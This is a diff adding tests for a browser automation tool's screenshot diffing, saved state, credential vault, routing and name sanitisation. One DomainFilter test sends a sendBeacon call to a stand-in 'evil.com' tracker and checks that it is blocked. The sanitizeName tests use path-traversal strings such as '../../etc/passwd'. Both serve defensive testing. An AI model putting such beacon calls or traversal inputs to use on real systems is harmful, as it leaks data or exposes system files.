@@ -19,6 +19,8 @@ import { PolicyChecker } from '../src/policy';
 import { AuthVault } from '../src/auth-vault';
 import { formatAsHar } from '../src/har';
 import { loadConfig } from '../src/config';
+import { decodePNG, compareScreenshots, encodePNG, generateDiffImage } from '../src/png-compare';
+import { sanitizeName } from '../src/sanitize';
 import * as fs from 'fs';
 import * as path from 'path';
 
@@ -561,5 +563,487 @@ describe('DomainFilter init script', () => {
       return navigator.sendBeacon('https://tracker.evil.com/ping', 'data');
     });
     expect(result).toBe(false);
+  });
+});
+
+// ─── Screenshot-diff (decodePNG + compareScreenshots) ────────────
+
+describe('decodePNG', () => {
+  test('decodes a real screenshot into valid RGBA pixel data', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const buffer = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    const decoded = decodePNG(buffer);
+    expect(decoded.width).toBeGreaterThan(0);
+    expect(decoded.height).toBeGreaterThan(0);
+    expect(decoded.data).toBeInstanceOf(Buffer);
+    expect(decoded.data.length).toBe(decoded.width * decoded.height * 4);
+  });
+
+  test('throws on invalid PNG data', () => {
+    expect(() => decodePNG(Buffer.from('not a png file'))).toThrow('Not a valid PNG file');
+  });
+});
+
+describe('compareScreenshots', () => {
+  test('identical screenshots return PASS with 0% mismatch', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const buffer = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    const result = compareScreenshots(buffer, buffer);
+    expect(result.passed).toBe(true);
+    expect(result.mismatchPct).toBe(0);
+    expect(result.diffPixels).toBe(0);
+    expect(result.totalPixels).toBeGreaterThan(0);
+  });
+
+  test('different pages return FAIL with mismatch > 0', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const basicBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
+    const formsBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    const result = compareScreenshots(basicBuf, formsBuf);
+    expect(result.passed).toBe(false);
+    expect(result.mismatchPct).toBeGreaterThan(0);
+  });
+
+  test('threshold 100 passes even for different pages', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const basicBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
+    const formsBuf = await bm.getPage().screenshot({ fullPage: true }) as Buffer;
+    expect(compareScreenshots(basicBuf, formsBuf, 100).passed).toBe(true);
+  });
+});
+
+describe('screenshot-diff command', () => {
+  const ssTempFiles: string[] = [];
+  afterAll(() => { for (const f of ssTempFiles) try { fs.unlinkSync(f); } catch {} });
+
+  test('same page returns PASS', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const bl = `/tmp/browse-test-ss-same-${Date.now()}.png`;
+    ssTempFiles.push(bl);
+    await handleMetaCommand('screenshot', [bl], bm, async () => {});
+    const result = await handleMetaCommand('screenshot-diff', [bl], bm, async () => {});
+    expect(result).toContain('Result: PASS');
+    expect(result).toContain('Mismatch: 0.000%');
+  });
+
+  test('different page returns FAIL with diff saved', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const bl = `/tmp/browse-test-ss-diff-${Date.now()}.png`;
+    ssTempFiles.push(bl);
+    await handleMetaCommand('screenshot', [bl], bm, async () => {});
+    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
+    const result = await handleMetaCommand('screenshot-diff', [bl], bm, async () => {});
+    expect(result).toContain('Result: FAIL');
+    expect(result).toContain('Diff saved:');
+    const diffPath = bl.replace('.png', '-diff.png');
+    ssTempFiles.push(diffPath);
+    expect(fs.existsSync(diffPath)).toBe(true);
+  });
+
+  test('--threshold 100 passes even for different pages', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const bl = `/tmp/browse-test-ss-thresh-${Date.now()}.png`;
+    ssTempFiles.push(bl);
+    await handleMetaCommand('screenshot', [bl], bm, async () => {});
+    await handleWriteCommand('goto', [baseUrl + '/forms.html'], bm);
+    const result = await handleMetaCommand('screenshot-diff', [bl, '--threshold', '100'], bm, async () => {});
+    expect(result).toContain('Result: PASS');
+  });
+
+  test('missing baseline throws error', async () => {
+    await expect(
+      handleMetaCommand('screenshot-diff', ['/tmp/browse-nonexistent.png'], bm, async () => {})
+    ).rejects.toThrow('Baseline file not found');
+  });
+
+  test('no args throws usage error', async () => {
+    await expect(
+      handleMetaCommand('screenshot-diff', [], bm, async () => {})
+    ).rejects.toThrow('Usage:');
+  });
+});
+
+// ─── State save/load/list/show ───────────────────────────────────
+
+describe('State', () => {
+  const stLocalDir = process.env.BROWSE_LOCAL_DIR || '/tmp';
+  const stDir = `${stLocalDir}/states`;
+  const stNames = ['st-test1', 'st-restore', 'st-default'];
+  function stCleanup() {
+    for (const n of stNames) try { fs.unlinkSync(`${stDir}/${n}.json`); } catch {}
+    try { fs.rmdirSync(stDir); } catch {}
+  }
+  beforeAll(() => stCleanup());
+  afterAll(() => stCleanup());
+
+  function extractStatePath(output: string): string {
+    const m = output.match(/State saved: (.+)/);
+    if (!m) throw new Error(`Could not extract path from: ${output}`);
+    return m[1];
+  }
+
+  test('state list with no saved states', async () => {
+    const result = await handleMetaCommand('state', ['list'], bm, async () => {});
+    expect(result).toBe('(no saved states)');
+  });
+
+  test('state save persists file to disk', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleWriteCommand('cookie', ['st-save=hello'], bm);
+    await handleReadCommand('storage', ['set', 'stKey', 'stVal'], bm);
+    const result = await handleMetaCommand('state', ['save', 'st-test1'], bm, async () => {});
+    expect(result).toContain('State saved');
+    const p = extractStatePath(result);
+    expect(fs.existsSync(p)).toBe(true);
+    const data = JSON.parse(fs.readFileSync(p, 'utf-8'));
+    expect(data).toHaveProperty('cookies');
+    expect(data).toHaveProperty('origins');
+  });
+
+  test('state list after save shows entry', async () => {
+    const result = await handleMetaCommand('state', ['list'], bm, async () => {});
+    expect(result).toContain('st-test1');
+    expect(result).toMatch(/\d+B/);
+  });
+
+  test('state show displays counts', async () => {
+    const result = await handleMetaCommand('state', ['show', 'st-test1'], bm, async () => {});
+    expect(result).toContain('State: st-test1');
+    expect(result).toContain('Cookies:');
+    expect(result).not.toContain('Cookies: 0');
+  });
+
+  test('state load restores cookies', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleWriteCommand('cookie', ['st-restore-me=yes'], bm);
+    await handleMetaCommand('state', ['save', 'st-restore'], bm, async () => {});
+    let cookies = await handleReadCommand('cookies', [], bm);
+    expect(cookies).toContain('st-restore-me');
+    await bm.getContext()!.clearCookies();
+    cookies = await handleReadCommand('cookies', [], bm);
+    expect(cookies).not.toContain('st-restore-me');
+    const result = await handleMetaCommand('state', ['load', 'st-restore'], bm, async () => {});
+    expect(result).toContain('State loaded');
+    cookies = await handleReadCommand('cookies', [], bm);
+    expect(cookies).toContain('st-restore-me');
+  });
+
+  test('state show non-existent throws', async () => {
+    expect(
+      handleMetaCommand('state', ['show', 'nonexistent'], bm, async () => {})
+    ).rejects.toThrow('State file not found');
+  });
+
+  test('state invalid subcommand throws', async () => {
+    expect(
+      handleMetaCommand('state', ['bogus'], bm, async () => {})
+    ).rejects.toThrow('Usage:');
+  });
+});
+
+// ─── Auth login flow ─────────────────────────────────────────────
+
+describe('AuthVault login flow', () => {
+  const authDir = `/tmp/browse-test-auth-login-${Date.now()}`;
+  beforeAll(() => {
+    process.env.BROWSE_ENCRYPTION_KEY = 'a'.repeat(64);
+    fs.mkdirSync(authDir, { recursive: true });
+  });
+  afterAll(() => {
+    delete process.env.BROWSE_ENCRYPTION_KEY;
+    try { fs.rmSync(authDir, { recursive: true }); } catch {}
+  });
+
+  test('auto-detects selectors and fills login form', async () => {
+    const vault = new AuthVault(authDir);
+    vault.save('test-login', `${baseUrl}/login.html`, 'user@test.com', 'secret123');
+    const result = await vault.login('test-login', bm);
+    expect(result).toContain('Logged in as user@test.com');
+  });
+
+  test('login with non-existent credential throws', async () => {
+    const vault = new AuthVault(authDir);
+    await expect(vault.login('nonexistent', bm)).rejects.toThrow('not found');
+  });
+
+  test('login with explicit selectors fills form', async () => {
+    const vault = new AuthVault(authDir);
+    vault.save('custom-sel', `${baseUrl}/login.html`, 'admin@test.com', 'adminpass', {
+      username: 'input[name="email"]',
+      password: 'input[name="password"]',
+      submit: 'button[type="submit"]',
+    });
+    const result = await vault.login('custom-sel', bm);
+    expect(result).toContain('Logged in as admin@test.com');
+    const currentUrl = bm.getPage().url();
+    expect(currentUrl).toContain('email=admin%40test.com');
+    expect(currentUrl).toContain('password=adminpass');
+  });
+});
+
+// ─── Route block/fulfill/clear ───────────────────────────────────
+
+describe('route command', () => {
+  afterAll(async () => {
+    try { await handleWriteCommand('route', ['clear'], bm); } catch {}
+  });
+
+  test('route block prevents matching requests', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const result = await handleWriteCommand('route', ['**/blocked-resource*', 'block'], bm);
+    expect(result).toContain('Blocking requests matching:');
+    const fetchResult = await handleReadCommand('js', [
+      "fetch('/blocked-resource').then(() => 'ok').catch(() => 'blocked')",
+    ], bm);
+    expect(fetchResult).toBe('blocked');
+    await handleWriteCommand('route', ['clear'], bm);
+  });
+
+  test('route fulfill returns custom response', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleWriteCommand('route', ['**/mock-api*', 'fulfill', '200', '{"result":"mocked"}'], bm);
+    const fetchResult = await handleReadCommand('js', [
+      "fetch('/mock-api').then(r => r.text())",
+    ], bm);
+    expect(fetchResult).toBe('{"result":"mocked"}');
+    await handleWriteCommand('route', ['clear'], bm);
+  });
+
+  test('route clear removes all routes', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleWriteCommand('route', ['**/will-be-cleared*', 'block'], bm);
+    const clearResult = await handleWriteCommand('route', ['clear'], bm);
+    expect(clearResult).toBe('All routes cleared');
+    const fetchResult = await handleReadCommand('js', [
+      "fetch('/will-be-cleared').then(r => r.status.toString()).catch(() => 'blocked')",
+    ], bm);
+    expect(fetchResult).toBe('404');
+  });
+
+  test('route with no args throws usage error', async () => {
+    await expect(handleWriteCommand('route', [], bm)).rejects.toThrow('Usage');
+  });
+
+  test('multiple routes can coexist', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleWriteCommand('route', ['**/route-a*', 'block'], bm);
+    await handleWriteCommand('route', ['**/route-b*', 'fulfill', '200', 'hello-b'], bm);
+    const resultA = await handleReadCommand('js', [
+      "fetch('/route-a').then(() => 'ok').catch(() => 'blocked')",
+    ], bm);
+    expect(resultA).toBe('blocked');
+    const resultB = await handleReadCommand('js', [
+      "fetch('/route-b').then(r => r.text())",
+    ], bm);
+    expect(resultB).toBe('hello-b');
+    await handleWriteCommand('route', ['clear'], bm);
+  });
+});
+
+// ─── Clipboard read/write ────────────────────────────────────────
+
+describe('Clipboard', () => {
+  test('clipboard write then read returns the text', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    await handleReadCommand('clipboard', ['write', 'test clipboard data'], bm);
+    const result = await handleReadCommand('clipboard', [], bm);
+    expect(result).toBe('test clipboard data');
+  });
+
+  test('clipboard write with no text throws', async () => {
+    try {
+      await handleReadCommand('clipboard', ['write'], bm);
+      expect(true).toBe(false);
+    } catch (err: any) {
+      expect(err.message).toContain('Usage');
+    }
+  });
+});
+
+// ─── sanitizeName ────────────────────────────────────────────────
+
+describe('sanitizeName', () => {
+  test('strips path separators', () => {
+    expect(sanitizeName('../../etc/passwd')).toBe('____etc_passwd');
+  });
+  test('strips backslashes', () => {
+    expect(sanitizeName('..\\..\\windows')).toBe('____windows');
+  });
+  test('rejects empty result', () => {
+    expect(() => sanitizeName('..')).toThrow('Invalid name');
+  });
+  test('allows normal names', () => {
+    expect(sanitizeName('my-site')).toBe('my-site');
+  });
+});
+
+// ─── element-state ───────────────────────────────────────────────
+
+describe('element-state', () => {
+  test('returns state for an element', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const result = await handleReadCommand('element-state', ['a'], bm);
+    const state = JSON.parse(result);
+    expect(state).toHaveProperty('visible');
+    expect(state).toHaveProperty('tag');
+  });
+});
+
+// ─── Dialog handling ─────────────────────────────────────────────
+
+describe('Dialog handling', () => {
+  test('dialog-accept sets auto-action', async () => {
+    const result = await handleWriteCommand('dialog-accept', ['yes'], bm);
+    expect(result).toContain('accept');
+  });
+  test('dialog-dismiss sets auto-action', async () => {
+    const result = await handleWriteCommand('dialog-dismiss', [], bm);
+    expect(result).toContain('dismiss');
+  });
+  test('dialog returns no dialog when none triggered', async () => {
+    const result = await handleReadCommand('dialog', [], bm);
+    expect(result).toContain('no dialog');
+  });
+});
+
+// ─── Device emulation ────────────────────────────────────────────
+
+describe('Device emulation', () => {
+  test('emulate iphone changes viewport', async () => {
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const result = await handleWriteCommand('emulate', ['iPhone 15'], bm);
+    expect(result).toContain('Emulating');
+    expect(result).toContain('Mobile: true');
+    // Reset
+    await handleWriteCommand('emulate', ['reset'], bm);
+  });
+
+  test('emulate reset restores desktop', async () => {
+    const result = await handleWriteCommand('emulate', ['reset'], bm);
+    expect(result).toContain('reset to desktop');
+  });
+
+  test('emulate unknown device throws with suggestions', async () => {
+    try {
+      await handleWriteCommand('emulate', ['nonexistent-device-xyz'], bm);
+      expect(true).toBe(false);
+    } catch (err: any) {
+      expect(err.message).toContain('Unknown device');
+    }
+  });
+});
+
+// ─── PNG encoder roundtrip + generateDiffImage ───────────────────
+
+describe('PNG encoder', () => {
+  test('encodePNG produces valid PNG that roundtrips', () => {
+    // Create a small 2x2 red image
+    const img = { width: 2, height: 2, data: Buffer.alloc(16) };
+    img.data[0] = 255; img.data[3] = 255; // pixel 0: red
+    img.data[4] = 0; img.data[7] = 255;   // pixel 1: black
+    img.data[8] = 0; img.data[11] = 255;  // pixel 2: black
+    img.data[12] = 255; img.data[15] = 255; // pixel 3: red
+
+    const encoded = encodePNG(img);
+    expect(encoded[0]).toBe(137); // PNG magic
+    expect(encoded[1]).toBe(80);  // P
+
+    const decoded = decodePNG(encoded);
+    expect(decoded.width).toBe(2);
+    expect(decoded.height).toBe(2);
+    // Check pixels match
+    for (let i = 0; i < 16; i++) {
+      expect(decoded.data[i]).toBe(img.data[i]);
+    }
+  });
+
+  test('generateDiffImage returns valid PNG with red highlights', () => {
+    const base = { width: 2, height: 1, data: Buffer.from([255, 0, 0, 255, 0, 255, 0, 255]) };
+    const curr = { width: 2, height: 1, data: Buffer.from([255, 0, 0, 255, 0, 0, 255, 255]) };
+    const diff = generateDiffImage(base, curr, 30);
+    expect(diff[0]).toBe(137); // valid PNG
+    const decoded = decodePNG(diff);
+    expect(decoded.width).toBe(2);
+    expect(decoded.height).toBe(1);
+    // First pixel matches — should be dimmed
+    expect(decoded.data[0]).toBeLessThan(255); // dimmed red
+    // Second pixel differs — should be bright red
+    expect(decoded.data[4]).toBe(255); // red channel = 255
+  });
+});
+
+// ─── Auth commands via handler ───────────────────────────────────
+
+describe('Auth commands via handler', () => {
+  const tmpDir = '/tmp/browse-test-auth-handler';
+
+  beforeAll(() => {
+    process.env.BROWSE_ENCRYPTION_KEY = 'b'.repeat(64);
+    process.env.BROWSE_LOCAL_DIR = tmpDir;
+    fs.mkdirSync(tmpDir, { recursive: true });
+  });
+
+  afterAll(() => {
+    delete process.env.BROWSE_ENCRYPTION_KEY;
+    delete process.env.BROWSE_LOCAL_DIR;
+    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
+    // Also clean up /tmp/auth if handleMetaCommand used the module-level LOCAL_DIR
+    try { fs.unlinkSync('/tmp/auth/testhandler.json'); } catch {}
+  });
+
+  test('auth save, list, delete roundtrip', async () => {
+    const shutdown = async () => {};
+    const saveResult = await handleMetaCommand('auth', ['save', 'testhandler', 'https://example.com', 'user', 'pass123'], bm, shutdown);
+    expect(saveResult).toContain('Credentials saved');
+
+    const listResult = await handleMetaCommand('auth', ['list'], bm, shutdown);
+    expect(listResult).toContain('testhandler');
+    expect(listResult).not.toContain('pass123');
+
+    const deleteResult = await handleMetaCommand('auth', ['delete', 'testhandler'], bm, shutdown);
+    expect(deleteResult).toContain('Credentials deleted');
+  });
+});
+
+// ─── HAR recording via handler ───────────────────────────────────
+
+describe('HAR recording via handler', () => {
+  test('har start, navigate, har stop produces file', async () => {
+    const shutdown = async () => {};
+    await handleMetaCommand('har', ['start'], bm, shutdown);
+    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
+    const result = await handleMetaCommand('har', ['stop', '/tmp/browse-test-har.har'], bm, shutdown);
+    expect(result).toContain('HAR saved');
+    const har = JSON.parse(fs.readFileSync('/tmp/browse-test-har.har', 'utf-8'));
+    expect(har.log.version).toBe('1.2');
+    expect(har.log.entries.length).toBeGreaterThan(0);
+    fs.unlinkSync('/tmp/browse-test-har.har');
+  });
+
+  test('har stop without start throws', async () => {
+    const shutdown = async () => {};
+    try {
+      await handleMetaCommand('har', ['stop'], bm, shutdown);
+      expect(true).toBe(false);
+    } catch (err: any) {
+      expect(err.message).toContain('No active HAR');
+    }
+  });
+});
+
+// ─── diff command ────────────────────────────────────────────────
+
+describe('diff command', () => {
+  test('diff between same URL shows no changes', async () => {
+    const shutdown = async () => {};
+    const result = await handleMetaCommand('diff', [baseUrl + '/basic.html', baseUrl + '/basic.html'], bm, shutdown);
+    expect(result).toContain('---');
+    expect(result).toContain('+++');
+    // Same URL = no + or - lines (only space-prefixed)
+    const lines = result.split('\n').filter(l => l.startsWith('+') || l.startsWith('-'));
+    // Only the header lines start with +/-, content lines should match
+    expect(lines.length).toBeLessThanOrEqual(2); // just the --- and +++ headers
   });
 });
